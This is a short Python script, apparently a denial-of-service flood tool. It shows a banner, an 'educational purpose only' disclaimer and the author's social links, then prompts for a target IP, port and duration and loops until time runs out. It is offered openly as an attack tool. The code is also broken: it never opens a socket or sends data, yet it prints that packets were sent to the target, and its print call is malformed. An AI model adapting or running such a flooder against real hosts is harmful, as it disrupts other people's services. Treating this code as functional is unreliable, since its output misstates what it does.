import os
import sys
import time
import socket
import random
bytes = random._urandom(1024)
os.system("clear")

print("""

              ______         ______           _______              ______          __   ___           
 .' ___  |       |_   _ \         |_   __ \            |_   _ `.       |  ].'   `.         
/ .'   \_|  _   __ | |_) |  .---.   | |__) |             | | `. \  .--.| |/  .-.  \ .--.   
| |        [ \ [  ]|  __'. / /__\\  |  __ /              | |  | |/ /'`\' || |   | |( (`\]  
\ `.___.'\  \ '/ /_| |__) || \__., _| |  \ \_  _______  _| |_.' /| \__/  |\  `-'  / `'.'.  
 `.____ .'[\_:  /|_______/  '.__.'|____| |___||_______||______.'  '.__.;__]`.___.' [\__) ) 
           \__.'                                                                           
""")
print("****************************************************************************************")
print("*THIS IS STRICTLY FOR EDUCATIONAL PURPOSE ONLY,IM NOT RESPONSIBLE FOR YOUR ACTION...   *")
print("*This tool is coded by cyber_pops                                                      *")
print("*Follow me on instagram:https://www.instagram.com/__ajmal_official_/                   *")
print("*FIND ME AND ABOUT ON MY WEBSITE:redhacker1906.wixsite.com                             *")
print("****************************************************************************************")
IP = raw_input("[0!]Enter the target ip: ")
PORT = int(input("[0!]Enter the target port: "))
DUR = int(input("[0]!Enter the duration : "))
timeout = time.time() + DUR
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sent = sent + 1
        print("sent %s packets to %s",(sent, IP, PORT))
    except KeyboardInterrupt:
        sys.exit()
